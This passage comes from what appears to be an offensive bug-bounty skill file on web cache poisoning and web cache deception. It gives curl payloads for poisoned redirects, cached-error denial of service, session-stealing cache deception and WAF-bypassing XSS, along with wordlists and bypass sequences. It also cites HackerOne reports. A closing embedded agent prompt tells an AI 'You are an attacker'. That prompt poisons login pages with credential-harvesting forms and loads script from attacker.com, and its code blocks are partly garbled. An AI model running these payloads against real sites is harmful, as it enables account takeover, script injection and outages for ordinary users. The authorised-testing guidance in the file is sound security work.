  -H "X-Forwarded-Port: 1337" | grep -i "location:"
# Location: https://target.com:1337/...  cached -> clean visitors redirected to dead port
```

### Cached 404/403/501/502 DoS (CPDoS)

```bash
# Backslash-vs-slash normalization (#1695604)
curl -s -I "https://cdn.shopify.com\static\javascripts\vendor\app.js?cb=$RANDOM"
# cache sees /static/... (HIT) but origin sees backslashes -> 404 cached

# Method override (#1160407)
curl -s -I "https://assets.target.net/js/app.js?cb=$RANDOM" \
  -H "X-HTTP-Method-Override: HEAD"

# Platform debug header (#728664)
curl -s -I "https://app.target.com/static.js?cb=$RANDOM" \
  -H "X-CF-APP-INSTANCE: xxx:1"

# Invalid transfer encoding / authorization (#622122, #1173153)
curl -s -I "https://www.target.com/js/app.js?cb=$RANDOM" \
  -H "Transfer-Encoding: 123"
curl -s -I "https://downloads.target.com/file.zip?cb=$RANDOM" \
  -H "Authorization: SharedKeyLite bad:value"
# Then fetch clean: curl -s -I "https://.../app.js" | grep "HTTP/"
```

### Web Cache Deception (path-suffix)

```bash
# Authenticated request with your session
curl -s -b "session=YOUR_SESSION" \
  "https://target.com/account/profile.css?cb=$RANDOM"
# grep cached body for email / member id / HASESSIONV3 / gdtoken / ha.crumb

# Clean second client retrieves the victim's cached page
curl -s "https://target.com/account/profile.css" | grep -i "HASESSIONV3\|gdtoken\|email"

# Vanilla-style: /home.php/non-existent.css ; Expedia-style: /.../x.jpeg?triagethis
```

### CORS ACAO poisoning (#591302)

```bash
curl -s -D - -o /dev/null "https://target.com/wp-json/?cb=$RANDOM" \
  -H "Origin: evil.example" | grep -i "access-control-allow-origin"
# Repeat without Origin; if evil.example/* is cached, CORS is poisoned
```

### Parameter pollution / array (#326639)

```bash
curl -s "https://boards.target.com/embed/js?for[]=twitter&for[]=&for[]=&cb=$RANDOM" | grep "Grnhse.Settings"
```

### Cookie-reflected cached XSS with WAF bypass (#1760213)

```bash
curl -s "https://target.com/route.php.js?cb=$RANDOM" \
  -H 'Cookie: hav=xss"</sc"ript><sv"g/onloa"d=aler"t"(document.doma"in)>'
# Server hides double quotes -> WAF bypass -> cached <script>/<svg> executes for victims
```

### Affiliate/product cache poison via `/../` (#1848940)

```bash
# Crafted link: https://amazon.ca/dp/[VICTIM-ID]/../[ATTACKER-ID]
# Victim's product URL now resolves to attacker-controlled cached product.
```

### Grep patterns for Burp / ZAP history

```
X-Cache: HIT
CF-Cache-Status: HIT
Age: [1-9]
evil\.attacker\.com / canary\d+\. / target\.com:1337
Content-Type: text/css   (but body is HTML/JSON)      <- WCD indicator
Cache-Control: public.*max-age  (on authenticated endpoint)
Location: .*:1337        <- poisoned redirect
Access-Control-Allow-Origin: (evil|\*)
```

### Wordlists

```
# Unkeyed headers (Burp Param Miner "Guess headers" or Intruder)
X-Forwarded-Host   X-Host   X-Forwarded-Server   X-HTTP-Host-Override
Forwarded   X-Original-URL   X-Rewrite-URL   X-Forwarded-Scheme
X-Forwarded-Proto   X-Forwarded-Port   True-Client-IP   h0st
Origin   Authorization   X-CF-APP-INSTANCE   X-HTTP-Method-Override

# WCD static suffixes
.css  .js  .jpg  .jpeg  .png  .gif  .ico  .woff2  .avif  .svg
;.css  %2e%2ecss  /non-existent.css  /x.jpeg?cb=1
```

### Additional payload forms seen in the corpus

```bash
# Canary reflected into redirect Location, with cache-buster (#409370)
curl -H 'X-Forwarded-Host: www.target.com:123' \
     'https://www.target.com/index.php?dontpoisoneveryone=1'

# Arbitrary port in Host itself (#1096609, #1346618)
curl -ik 'https://themes.target.com:443/?g4mm4=hitthecache' \
     -H 'Host: themes.target.com:1337' | grep ':1337'

# Host-header → XSS in canonical/meta tags (#415168, #394016)
curl 'https://target.com/?xx' \
     -H "X-Forwarded-Host: canary'\"><script>alert(document.domain)</script>"

# data-site-root / data-locale-root DOM-XSS trigger (#303730)
curl -i -s -k -X GET 'https://catalog.target.gov/data.json?cb=<random>' \
     -H 'X-Forwarded-Host: attacker.example'

# h0st header → cached 502 (#942629)
curl 'https://www.target.gov/?xyzxyz=1' -H 'h0st: wrtqvavjigwdvoqk'

# Trailing-dot / suffix normalization WCD (#1271944 style)
curl -b 'session=...' 'https://target.com/account/randomstring.css?cb=<random>'
```

### What is NOT cache poisoning (false positives to reject)

- **Self-reflection only.** Your canary appears in your own poisoned response but a clean second client gets the normal response. No cache store — not a finding.
- **Header echoed in an error string.** Some apps format the header into a 400 message. Echo ≠ cached response served to others.
- **`Age: 0` on every request.** The object may be revalidating or the key may include a random token; confirm actual cross-client storage.
- **A poison that only affects your own session/cookie.** If the cache key includes your session cookie, other users never receive it — it is a self-cache.
- **DoS with no victim impact.** Breaking a cache key that no real user requests (throwaway path) demonstrates nothing; show a real, shared key.
- **Slow or flaky reproduction.** If the response appears only on one edge node or requires racing TTL, resolve it before reporting — triage will not reproduce it.

### Tooling notes

- **Burp Param Miner** — "Guess headers" mode is the canonical way to discover unkeyed headers automatically. It adds a random cache-buster to each probe by default; keep that behavior to avoid poisoning live keys.
- **Burp HTTP Request Smuggler** — for the smuggling→cache chain (#919175, Akamai family). Confirm desync on a harmless path before attempting cache poisoning.
- **ffuf / Intruder** — fuzz header names and extension suffixes from the wordlists above. Keep a fixed `?cb=<random>` per fuzz batch so results land on predictable throwaway keys.
- **Two client contexts** — have a clean curl profile, an incognito browser, and ideally a different egress IP ready before you start. Gate 0 requires all findings to be re-observed from a context that never sent the poison.
- **Never auto-loop a live poison.** Several reports show researchers running `while true; do curl -H "X-Forwarded-Host: ..." ...; done` against production (#1096609, #429747). Reproduce that only against your own lab, or with a cache-buster; against a live bug-bounty target it risks real user impact and a duplicate/N/A.

---

## Common Root Causes

1. **CDN caches on URL path/extension while origin ignores extra path segments.** Engineers write "cache everything matching `*.css`" without realizing a dynamic route can be reached at `/account/profile.css`. The origin normalizes to the dynamic handler; the cache keeps the static-looking key. This is the root of classic WCD (Vanilla #593712, Lyst #631589, Discourse #260697) and the Cloudflare extension-list gap.

2. **Unkeyed header forwarded into URL generation.** Proxies pass `X-Forwarded-Host`/`Host` to the app for canonical links, redirects, `og:url`, and script sources but omit it from the cache key. The poisoned response is cached and served to everyone (#409370, #303730, #394016, #415168, #504514, #487). The most dangerous variant is when the reflected value lands inside an HTML attribute — a `'` or `"` breakout turns a defacement into XSS for every visitor.

3. **Cache and origin disagree on normalization.** Backslash vs slash (#1695604), `/../` segments (#1848940), encoded delimiters, or method overrides (#1160407) produce a key that maps to a different resource than what was stored. The resulting error/empty/attacker response is cached under the victim's clean key. James Kettle's 2024 "Gotta cache 'em all" research formalized this as cache-key path-normalization discrepancies across Cloudflare, Fastly, and GCP — the same class at CDN scale.

4. **Error responses cached like success responses.** No exclusion for 404/403/501/502 status codes, so one malformed header poisons an asset into an error for the whole TTL (#622122, #728664, #1173153, #942629, #1976449).

5. **CORS header reflected and cached.** `Access-Control-Allow-Origin` is built from the `Origin` header and cached, breaking CORS or enabling cross-origin reads (#591302, #921704).

6. **Missing `Vary` / ignored `Vary`.** Developers forget `Vary: X-Forwarded-Host`, or the CDN strips/ignores `Vary` on static assets, so a header-dependent response is cached under one key.

7. **Shared cache across trust boundaries.** GitLab CI runner cache shared across projects (#301432), affiliate caches shared across merchants (#1848940), and tenant-agnostic CDN keys let one user's input poison everyone.

8. **Client-side cache state not scoped to trust.** libcurl's Alt-Svc parser leaks attributes into h3 routes (#3483902), TLS session cache ignores callback flags (#3761647), HSTS cache import drops children (#3973124/#3972357), and Rails `raw: true` cache fetches unmarshal attacker strings (#413388) — the same "cache key/scope mismatch" bug class outside the web tier.

9. **Insecure browser/HTTP cache-control.** Missing `no-store` lets sensitive pages survive logout and browser Back (#7909, #158270, #231805, #493791) — lower-severity, local-victim variant of the same missing-cache-boundary theme.

### One-line synthesis

Every root cause above reduces to the same defect: **a value that changes the response is not part of the cache key, or the key does not identify the response the origin actually produced.** Whether the unkeyed value is an HTTP header, a path delimiter, an HTTP method, a cookie, or a client-side TLS/HSTS setting, the exploitation sequence is identical — reflect a canary, confirm it is stored under a shared key, and show a second client receiving it. The technique names in the frequency table (cache-layer 85, host-header 17, search-filter-sort 29, dos-resource 24) are just different entry points into that one invariant. Internalize the invariant and you can find this class on any cache, including ones not yet covered by a named tool or wordlist.

---

## Bypass Techniques

**Defense: WAF blocks known poison headers**
- Use less-common variants: `X-Host`, `X-Forwarded-Server`, `X-HTTP-Host-Override`, `Forwarded: host=evil.com`, `h0st`, `X-Original-URL`, `X-Rewrite-URL`.
- Obfuscate value: `X-Forwarded-Host: evil%2ecom`.
- Case variations: `x-forwarded-host`, `X-FORWARDED-HOST`.
- Header splitting via smuggling to reach the cache backend directly (#919175).

**Defense: edge strips attacker headers**
- HTTP/2 pseudo-header manipulation if the proxy downgrades to HTTP/1.1.
- Request smuggling (CL.TE/TE.CL) or hop-by-hop `Connection: Content-Length` desync across proxy tiers (Akamai worldwide-cache-poisoning family).
- Platform-specific headers the edge doesn't consider: `X-CF-APP-INSTANCE` (#728664), `X-HTTP-Method-Override` (#1160407), `Authorization` (#1173153), `Transfer-Encoding` (#622122).

**Defense: "require authentication before caching"**
- Web Cache Deception: append a static suffix so a cache rule that ignores auth stores the authenticated response (`.css`/`.js`/`.avif`).
- Use a suffix the CDN's static-extension allowlist includes but the origin still routes dynamically (.avif bypass of Cloudflare Cache Deception Armor).

**Defense: cache key includes full URL with query string**
- HTTP parameter pollution: cache keys on the full string but the app reads one param (`?legit=1&param=evil`) (#326639).
- Fat GET: body params processed by backend but absent from cache key.
- Path normalization mismatch: backslash for slash (#1695604), `/../` in product paths (#1848940).

**Defense: short TTL / rapid purging**
- Automate re-poisoning just ahead of TTL expiry; several reports note re-poisoning "every x sec/min" via Intruder (#1322732 re-poisoned paths the original fix missed).

**Defense: `Cache-Control: private` on sensitive endpoints**
- Check whether the CDN honors it (some ignore it when global cache rules override).
- Find adjacent cacheable endpoints reflecting the same sensitive data.

**Defense: string-matching filters for XSS payloads in cached bodies**
- Quote-splitting to evade WAF: `</sc"ript>`, `<sv"g/onloa"d=...>` — the server hides double quotes, reconstructing the tag after filtering (#1760213).
- Mutation-polyglot / double-encoded payloads for reflected contexts.

### Cache-tier bypasses worth sequencing

1. **Header-name mutation** — if `X-Forwarded-Host` is stripped, walk `X-Host`, `X-Forwarded-Server`, `X-HTTP-Host-Override`, `Forwarded: host=...`, `h0st`, `X-Original-URL`, and case variants. Each is a distinct edge/origin trust decision (#942629's `h0st` is the clearest example of a weird variant working).
2. **Origin-shape mutation** — supply a port, a trailing dot (`target.com.`), a userinfo form (`target.com@evil.com`), or an encoded host. If the origin normalizes it into a different host string than the edge used for the key, you get cache-key confusion.
3. **Path-shape mutation** — backslash for slash (#1695604), `/../` segments (#1848940), `;/`, encoded dots (`%2e%2ecss`), and static suffixes the CDN caches but the origin ignores.
4. **Verb/header override** — `X-HTTP-Method-Override: HEAD` (#1160407), `Transfer-Encoding` smuggling (#622122), `Authorization` crafted to force 403 (#1173153).
5. **TTL re-poisoning** — if the vendor purges quickly, re-send the poison just before expiry. #1322732 re-poisoned paths the original fix did not cover; the technique is automation with Intruder at a fixed interval.
6. **Fix-diffing** — after a patch, test sibling subdomains, sibling paths, and alternate header spellings. A fix applied to one path (#1322732) or one redirect field often leaves the rest live.

**Sequencing principle:** start with the simplest bypass that changes only one dimension. If you mutate header name, path shape, and encoding simultaneously, you cannot tell which control failed — and the report will not tell the client how to fix it.

---

## Gate 0 Validation

Before writing the report, confirm all three.

1. **What can the attacker DO right now?**
   - Can you point to a poisoned cache entry that a *separate, unauthenticated* request (different IP / incognito / second tool, WITHOUT your poison header) receives? If only your own poisoned request shows the canary, it is a self-cache — not a finding.
   - For CPDoS: does the clean second client actually get 404/403/501/502 on a previously working asset?
   - For WCD: does the clean client get the victim's session/PII/CSRF token, and is that token still live?
   - For CORS: is a permissive/bogus ACAO actually returned to a clean cross-origin request?
   - "Weird headers" or "the header was reflected" alone is not impact.

2. **What does the victim LOSE?**
   - Session/account compromise (cached session cookie or CSRF token → ATO, #1698316), OR
   - Arbitrary JS execution via poisoned asset (stored/DOM XSS, #303730/#394016/#415168/#1760213), OR
   - Service denial on a widely consumed asset (Shopify #1695604, PayPal #622122, GitLab #1160407), OR
   - Sensitive data disclosure (PII, user id, tokens cached and served publicly).
   - Quantify blast radius: global CDN edge (Critical/High), regional cache, or single server. State TTL so the reader knows persistence.

3. **Can it be reproduced in 10 minutes from scratch?**
   - Poison request → wait for store → second-client fetch → canary observed, all with a fresh cache-buster each run.
   - Is the cache key stable, or does the result depend on luck, edge node, or timing?
   - Could a second person follow your steps without prior knowledge and get the same second-client result?
   - If reproduction requires hitting one specific PoP or racing TTL, resolve the flakiness before submitting.

### Gate 0 evidence checklist (attach to the report)

- [ ] Poison request with the malicious header/parameter, showing the canary in the response.
- [ ] Clean second-client request to the SAME URL WITHOUT the poison header, showing the canary.
- [ ] Cache headers (`Age`, `X-Cache: HIT`, `CF-Cache-Status`) proving the response came from cache.
- [ ] The exact cache-buster used during safe testing, so triage can reproduce without harming users.
- [ ] TTL / `max-age` and an estimate of how many users share the key (global CDN, region, single origin).
- [ ] For XSS/ATO: proof the cached payload executes or the leaked token is accepted in a state-changing request.
- [ ] For CPDoS: a before/after pair showing the asset worked cleanly before the poison and returns the error afterward.

If you cannot check the second bullet, the report is not ready — that is the whole finding.

---

## Real Impact Examples

### Scenario 1 — Global CDN asset DoS via path normalization (Shopify CDN pattern, #1695604)
An attacker found that Shopify's cache treated a URL containing backslashes as equivalent to the clean forward-slash path, but the origin returned 404 for the backslash version. By requesting `https://cdn.shopify.com\static\javascripts\vendor\app.js`, the origin's 404 was cached under the clean asset key. Every subsequent request to the legitimate JS file received the cached 404, breaking any storefront loading that library. One HTTP request, global merchant impact, persisting until TTL. Same effect via invalid `Transfer-Encoding` in PayPal #622122, `X-HTTP-Method-Override` in GitLab #1160407, and `X-CF-APP-INSTANCE` in GSA #728664.

### Scenario 2 — Account takeover via Web Cache Deception (Expedia/abritel.fr pattern, #1698316)
An authenticated victim was phished into visiting `https://www.abritel.fr/search/.../minNightlyPrice/x.jpeg?triagethis`. The origin ignored the `.jpeg` suffix and returned the full dynamic profile page, including the `HASESSIONV3` session cookie and the `ha.crumb` CSRF token from `/traveler/profile/edit`. Because the URL ended in a CDN-cached extension, that authenticated response was stored publicly. The attacker fetched the same URL unauthenticated and recovered the session + CSRF token, using them to act as the victim. Variant: cached `gdtoken` disclosure (Glassdoor #1343086), `member id`/email (Lyst #631589, Vanilla #593712).

### Scenario 3 — Unkeyed header → stored DOM XSS at scale (catalog.data.gov, #303730)
The server trusted `X-Forwarded-Host` and used it to populate `data-site-root` and `data-locale-root` attributes on `<body>`. Client-side JavaScript fetched a JSON file from the URL in those attributes and wrote the response into the page — attacker-controlled script execution. The researcher could not make a victim send a malicious header, so they poisoned the response while it was cached by CloudFront; the payload was then served to every visitor of that cached page. This is the canonical demonstration that "I can't make a victim send a header" is defeated by caching the poisoned response. Discourse #394016 and QIWI #415168 show the same primitive landing in `@font-face`/canonical/meta tags as XSS.

### Scenario 4 — Poisoned redirect Location (HackerOne, #409370)
An attacker sent `curl -H 'X-Forwarded-Port: 123' https://www.hackerone.com/index.php?dontpoisoneveryone=1`. The app generated a 301 redirect containing the attacker-supplied port and the cache stored it. Loading the clean URL afterward redirected users to port 123, persistently breaking all redirects on `www.hackerone.com`. `X-Forwarded-Host` produced the same effect. Shopify #1096609 used an arbitrary port in the `Host` header; GSA #942629 used `h0st` to trigger a cached 502.

### Scenario 5 — Affiliate link poison via `/../` (Shopify Linkpop, #1848940)
The Linkpop service cached Amazon affiliate product pages keyed by product ID, but its URL regex accepted `https://amazon.ca/dp/[VICTIM-PRODUCT-ID]/../[ATTACKER-PRODUCT-ID]`. An attacker added that crafted link to their own Linkpop account; victims clicking the legitimate victim-product link were shown the attacker-controlled product. The poison persisted in the cache, diverting affiliate commission and enabling phishing. This shows cache poisoning as a business-logic weapon, not just DoS/XSS.

### Scenario 6 — CORS ACAO cache poison DoS (Automattic WP-JSON, #591302)
The WP-JSON implementation echoed an attacker-supplied `Origin` header into `Access-Control-Allow-Origin` and cached the result. Legitimate cross-origin consumers of the API then received an ACAO that did not match their origin, causing their browser to reject the response — a DoS against any site using the API from another origin. The same class can be turned into cross-user data reads if the cached ACAO is `*` or the attacker's origin.

### Scenario 7 — Request smuggling → poisoned cache (Basecamp #919175)
An authenticated Basecamp 2 user desynchronized the front-end and back-end servers (CL.TE), poisoning the shared socket with a response intended for the next visitor. Because the front-end infrastructure also cached content (observed during redirect probing), the smuggled response could be stored and served to a later victim. This is the bridge between `hunt-http-smuggling` and this skill: smuggling defeats edge header-stripping and cache-key normalization, delivering the poison directly to the cache backend. The Akamai worldwide-cache-poisoning family used the same idea with `Connection: Content-Length` hop-by-hop desync across proxy tiers, landing responses in edge caches for nearby IPs.

### Scenario 8 — Shared build cache cross-contamination (GitLab CI runner #301432)
The GitLab CI runner stored build caches as ZIP files uploaded to a shared cache instance (`runners-cache-4-internal.gitlab.com`, `runners-cache-3-internal.gitlab.com`) — even for dedicated runners. By creating a new project with a crafted `.gitlab-ci.yml`, an attacker could read another project's cache and write into it, poisoning the artifacts of all other projects sharing that cache. The researcher noted the difficulty of the attack — "I had to specify which paths to download from the cache" — a reminder that shared caches need explicit path/key scoping, whether they are HTTP CDNs or CI artifact stores.

---

## Disclosed Report Citations

The following 30 numbered cases are real, verified reports drawn from the study pack and the TOP-web-cache list. IDs and URLs are copied verbatim from those sources. They span both families: cache **poisoning** (attacker influences a cached response served to victims) and cache **deception** (attacker tricks the cache into storing a victim's private response), plus the smuggling, CORS, and client-side-cache variants.

1. **PayPal — DoS on PayPal via web cache poisoning** ([H1 #622122](https://hackerone.com/reports/622122)) — CPDoS via invalid `Transfer-Encoding` replacing JS with 501; 2019 — **$9,700** (TOP #1, 849 upvotes).
2. **HackerOne — Denial of service via cache poisoning** ([H1 #409370](https://hackerone.com/reports/409370)) — `X-Forwarded-Port`/`X-Forwarded-Host` poisoned 301 Location to invalid port; 2018 — **$2,500** (CVSS 5.7).
3. **Shopify — https://themes.shopify.com::: Host header web cache poisoning lead to DoS** ([H1 #1096609](https://hackerone.com/reports/1096609)) — arbitrary port in `Host` header; 2021 — **$2,900** (CVSS 4.6, TOP #5).
4. **GSA Bounty — Defacement of catalog.data.gov via web cache poisoning to stored DOMXSS** ([H1 #303730](https://hackerone.com/reports/303730)) — `X-Forwarded-Host` → `data-site-root` → stored DOMXSS via CloudFront; 2018 — **$750** (CVSS 8.6, TOP #4).
5. **Discourse — Web Cache Deception Attack (XSS)** ([H1 #394016](https://hackerone.com/reports/394016)) — `X-Forwarded-Host` reflected into `@font-face` src on CloudFront; 2018 — **$256** (TOP #11).
6. **QIWI — [*.rocketbank.ru] Web Cache Deception & XSS** ([H1 #415168](https://hackerone.com/reports/415168)) — `X-Forwarded-Host` injected into canonical/og:url/meta tags, cached; 2018 — **$200** (TOP #24).
7. **Shopify — DoS Vulnerability via Cache Poisoning on cdn.shopify.com and shopify-assets.shopifycdn.com** ([H1 #1695604](https://hackerone.com/reports/1695604)) — backslash-vs-slash normalization → cached 404; 2022 — **$3,800** (CVSS 4.9).
8. **GitLab — Cache poisoning Denial of Service affecting assets.gitlab-static.net** ([H1 #1160407](https://hackerone.com/reports/1160407)) — `X-HTTP-Method-Override: HEAD` → empty body cached by Varnish/GCS; 2021 — CVSS 7.5.
9. **Shopify — Shopify.com Web Cache Deception vulnerability leads to personal information and CSRF tokens leakage** ([H1 #1271944](https://hackerone.com/reports/1271944)) — path confusion + random `.css` suffix; 2021 — **$800** (CVSS 3.6, TOP #12).
10. **Expedia Group Bug Bounty — Cache Deception Allows Account Takeover** ([H1 #1698316](https://hackerone.com/reports/1698316)) — `.jpeg` path leaks `HASESSIONV3` + `ha.crumb`; 2022 — High.
11. **Lyst — Web cache poisoning attack leads to User information Disclosure and more** ([H1 #631589](https://hackerone.com/reports/631589)) — `blahblah.css` suffix caches logged-in user data; 2019 — CVSS 4.3 (TOP #15).
12. **Chaturbate — Web cache deception attack - expose token information** ([H1 #397508](https://hackerone.com/reports/397508)) — classic Omer-Gil WCD token disclosure; 2018 — CVSS 6.5 (TOP #19).
13. **Smule — Web cache poisoning leads to disclosure of CSRF token and sensitive information** ([H1 #504514](https://hackerone.com/reports/504514)) — `X-Forwarded-Host` rewrites request links; 2019 — Medium (TOP #16).
14. **Discourse — CSRF-tokens on pages without no-cache headers, resulting in ATO when using CloudFlare proxy (Web Cache Deception)** ([H1 #260697](https://hackerone.com/reports/260697)) — Cloudflare static-extension cache; 2018 — **$256** (TOP #10).
15. **Basecamp — HTTP request smuggling on Basecamp 2 allows web cache poisoning** ([H1 #919175](https://hackerone.com/reports/919175)) — CL.TE desync poisons next visitor's cached response; 2020 — Critical (TOP #20).
16. **Postmates — Web cache poisoning attack leads to user information and more** ([H1 #492841](https://hackerone.com/reports/492841)) — web cache poisoning → user info disclosure — **$500** (TOP #2, 343 upvotes).
17. **Glassdoor — Web Cache Poisoning leads to Stored XSS** ([H1 #1424094](https://hackerone.com/reports/1424094)) — poisoned cache stores XSS — $0 (TOP #3, 133 upvotes).
18. **Algolia — Web Cache Deception vulnerability on algolia.com leads to personal information leakage** ([H1 #1530066](https://hackerone.com/reports/1530066)) — WCD PII leakage — **$400** (TOP #14).
19. **Vanilla — Web cache deception attack on https://open.vanillaforums.com/messages/all** ([H1 #593712](https://hackerone.com/reports/593712)) — `home.php/non-existent.css` serves victim page; 2019 — **$150** (TOP #13).
20. **OLX — web cache deception in https://tradus.com lead to name/user_id enumeration and other info** ([H1 #537564](https://hackerone.com/reports/537564)) — `.js` suffix WCD; 2019 — $0 (TOP #7, 63 upvotes).
21. **Acronis — Web cache poisoning at www.acronis.com** ([H1 #1010858](https://hackerone.com/reports/1010858)) — `X-Forwarded-Port` until `:0` appears in response; 2020 — CVSS 6.9 (TOP #18).
22. **GSA Bounty — Denial of service via cache poisoning on https://www.data.gov/** ([H1 #942629](https://hackerone.com/reports/942629)) — `h0st` header → cached 502; 2020 — High.
23. **GSA Bounty — Cache poisoning DoS to various TTS assets** ([H1 #728664](https://hackerone.com/reports/728664)) — `X-CF-APP-INSTANCE` → cached 404 on CloudFoundry assets; 2019 — CVSS 7.5.
24. **U.S. Dept Of Defense — Cache Posioning leading do Denial of Service on `www.█████████`** ([H1 #1198434](https://hackerone.com/reports/1198434)) — 301 redirect with random port stored in cache; 2021 — High.
25. **U.S. Dept Of Defense — Cache Posioning leading to denial of service at `█████████` - Bypass fix from report #1198434** ([H1 #1322732](https://hackerone.com/reports/1322732)) — re-poisoned different paths the fix missed; 2021 — High.
26. **Exodus — DoS Vulnerability via Cache Poisoning on downloads.exodus.com** ([H1 #1173153](https://hackerone.com/reports/1173153)) — crafted `Authorization` → cached 403 via Cloudflare; 2021 — CVSS 7.5.
27. **Mozilla — DOS via cache poisoning on [developer.mozilla.org]** ([H1 #1976449](https://hackerone.com/reports/1976449)) — `X-Forwarded-Host` → cached 404; 2023 — Low.
28. **Shopify — URL Path Manipulation Enables Cache Poisoning of Amazon Affiliate Products in Shopify Linkpop** ([H1 #1848940](https://hackerone.com/reports/1848940)) — `/../` product-ID regex poison; 2025 — **$500**.
29. **Automattic — Denial of service to WP-JSON API by cache poisoning the CORS allow origin header** ([H1 #591302](https://hackerone.com/reports/591302)) — arbitrary `Origin` echoed into cached `Access-Control-Allow-Origin`; 2019 — Medium.
30. **Kaspersky — Several domains on kaspersky.com are vulnerable to Web Cache Deception attack** ([H1 #1185028](https://hackerone.com/reports/1185028)) — WCD across multiple domains — TOP #25, 20 upvotes.

---

## Related Skills & Chains

- **`hunt-host-header`** — Owns Host/`X-Forwarded-Host` injection that reaches app logic WITHOUT caching (reset-link poisoning, OAuth issuer, routing SSRF). This skill takes over the moment the poisoned response is CACHED and served to other users. Chain boundary: header reflected → check for `X-Cache: HIT` → if cached, hand to `hunt-web-cache`.
- **`hunt-xss`** — Cache poisoning is the multiplier that converts self-inflicted reflected XSS into stored XSS for every CDN-edge visitor. Chain: `X-Forwarded-Host: attacker.com` poisons cached `script src` → cached response contains `<script src="//attacker.com/x.js">` → all visitors execute attacker JS for the full `max-age` (#394016, #415168, #303730).
- **`hunt-http-smuggling`** — Smuggling bypasses edge header-stripping and cache-key normalization, delivering poison headers/responses to the cache backend directly. Chain: CL.TE smuggle → `X-Forwarded-Host` reaches origin past WAF → poisoned entry stored under victim URL → next visitor gets smuggled response (#919175; Akamai hop-by-hop desync family).
- **`hunt-auth-bypass`** — WCD turns authenticated pages into public cached responses, leaking session/CSRF tokens. Chain: `/account/profile.css` served as auth HTML, cached as static → unauthenticated attacker reads victim's email/tokens → live session → full ATO (#1698316, #1343086).
- **`hunt-csrf`** — A cached CSRF token (WCD) or cached permissive ACAO (CORS poison) defeats CSRF defenses at scale; verify the leaked token in a real state-changing request.
- **`hunt-dos`** — CPDoS is a distinct, often-paid DoS class here: cached 404/403/501/502 on a critical asset. Reports #622122, #1695604, #1160407, #728664, #1173153 show it accepted when the asset is widely consumed.
- **`hunt-ssrf`** — Several researchers found cache bugs while testing SSRF via host header (#1198434); a poisoned `X-Forwarded-Host` can also drive server-side fetches. Chain: header injection → cached fetch of attacker URL → data reflected and cached.
- **`security-arsenal`** — Load the unkeyed-header wordlist (`X-Forwarded-Host`, `X-Host`, `X-Forwarded-Server`, `X-HTTP-Host-Override`, `Forwarded`, `X-Original-URL`) and the WCD suffix list (`.css`, `.js`, `.jpg`, `;.css`, `%2e%2ecss`, `.avif`) before hand-fuzzing.
- **`triage-validation`** — Apply the Gate 0 pre-severity check: the poison MUST be observable from a second IP/incognito without the poison header, with a fresh cache-buster each run. If only your own browser sees it, it is a self-cache and will be N/A'd.


---

## Merged Source Knowledge

This section consolidates **79 unique knowledge blocks** from 3 curated source skills in `hunt-skills/`, `normal-skills/`, and `offensive-skills/`. Blocks overlapping the report-mined sections above were dropped; the complete, globally deduplicated source corpus is archived at `references/source-knowledge.md` (87 unique sections). No source section appears in more than one hunt skill.


### From `hunt-skills/bountyforge/references/hacking-agents/cache-poisoning-agent.md`

# Cache Poisoning Agent

You are an attacker that exploits web cache poisoning and web cache deception to inject malicious content into cached responses, leading to stored XSS on sensitive pages.

Other agents cover injection, smuggling, and infrastructure. You own: unkeyed header poisoning, CDN cache manipulation, CSP bypass, and cache deception attacks.

### Unkeyed Header Poisoning (H100 Proven)

This pattern appeared 2 times in the top 100 reports against a major financial platform, paying $18-20K.

**Step 1: Identify unkeyed headers**
```bash

# Test each header individually
for header in "X-Forwarded-Host: evil.com" "X-Original-URL: /admin" "X-Rewrite-URL: /secret" "X-Forwarded-For: 127.0.0.1" "X-Host: evil.com" "X-Forwarded-Proto: https"; do
  echo "Testing: $header"
  curl -s -D- -H "$header" "https://target.com/page" | grep -i "evil.com\|location\|x-cache"
done
```

**Step 2: Check if response is cached**
```bash

# Second: X-Cache: HIT → response is cached

curl -sI "https://target.com/page" | grep -i "cache-control\|x-cache\|x-cf\|age\|vary"
```

**Step 3: Poison the cache**
```bash

# Send poisoned request
curl -s -H "X-Forwarded-Host: evil.com" "https://target.com/page"

# Any user visiting /page now gets poisoned response
```

**Step 4: XSS in poisoned response**
```bash

# If header is reflected in response body
curl -s -H "X-Forwarded-Host: <script>alert(1)</script>" "https://target.com/page"

# Poison login page with credential-harvesting form
curl -s -H "X-Forwarded-Host: evil.com" "https://target.com/login"

# Poison API endpoint with malicious redirect
curl -s -H "X-Original-URL: https://evil.com" "https://target.com/api/config"

### CSP Bypass via Cache Poisoning (H100 Proven)

PayPal's CSP was bypassed using older jQuery libraries on scope domains.

**Finding CSP bypass gadgets:**
```bash

# Find older JS libraries on scope domains
curl -s "https://target.com" | grep -oP 'src="[^"]*\.js"' | while read js; do
  url=$(echo "$js" | sed 's/src="//' | sed 's/"//')
  echo "=== $url ==="
  curl -s "$url" | grep -i "jquery\|bootstrap\|angular" | head -3
done

# Search for jQuery specifically
grep -r "jquery" --include="*.js" /tmp/jsfiles/ | grep -v "min.js" | sort
```

**jQuery CSP bypass (proven pattern):**
```html
<!-- jQuery < 3.0 converts <script> tags to DOM elements -->
<input id=x style="display:none">
<svg/onload="document.getElementById('x').outerHTML='<script src=https://attacker.com/evil.js></script>'">
```

**Bootstrap gadget bypass:**
```html
<!-- Bootstrap < 3.4.1 data-target XSS -->
<div data-toggle="modal" data-target="<script>alert(1)</script>">
```

# Add fake extension to sensitive URL
curl -s "https://target.com/account/settings.css"
curl -s "https://target.com/account/profile.js"
curl -s "https://target.com/account/dashboard.json"

# Test various extensions
for ext in css js json xml pdf png jpg gif; do
  curl -sI "https://target.com/account/settings.$ext" | grep "X-Cache"
done
```

# Hide poison parameter from backend, but cache sees it
curl -s "https://target.com/page?legit=value;poison=xss"

# Send GET request with body
curl -s -X GET -d "evil=payload" "https://target.com/api/data"

# Step 1: Find open redirect on target
curl -s "https://target.com/redirect?url=https://evil.com" -D-

# Step 2: Use redirect target as X-Forwarded-Host
curl -s -H "X-Forwarded-Host: target.com/redirect?url=https://evil.com" \
  "https://target.com/page"

# Send with different User-Agent
curl -sI -H "User-Agent: Chrome" "https://target.com/page" | grep "X-Cache"
curl -sI -H "User-Agent: Firefox" "https://target.com/page" | grep "X-Cache"

### Testing Checklist

- [ ] Test X-Forwarded-Host, X-Original-URL, X-Rewrite-URL, X-Host
- [ ] Check if response is cached (Cache-Control, X-Cache, Age)
- [ ] Verify cache key doesn't include poisoned header
- [ ] Test if header is reflected in response body
- [ ] Find older JS libraries on scope for CSP bypass
- [ ] Test web cache deception with file extensions
- [ ] Test parameter cloaking and fat GET
- [ ] Monitor Burp Collaborator for victim interactions
- [ ] Test on login, dashboard, and payment pages

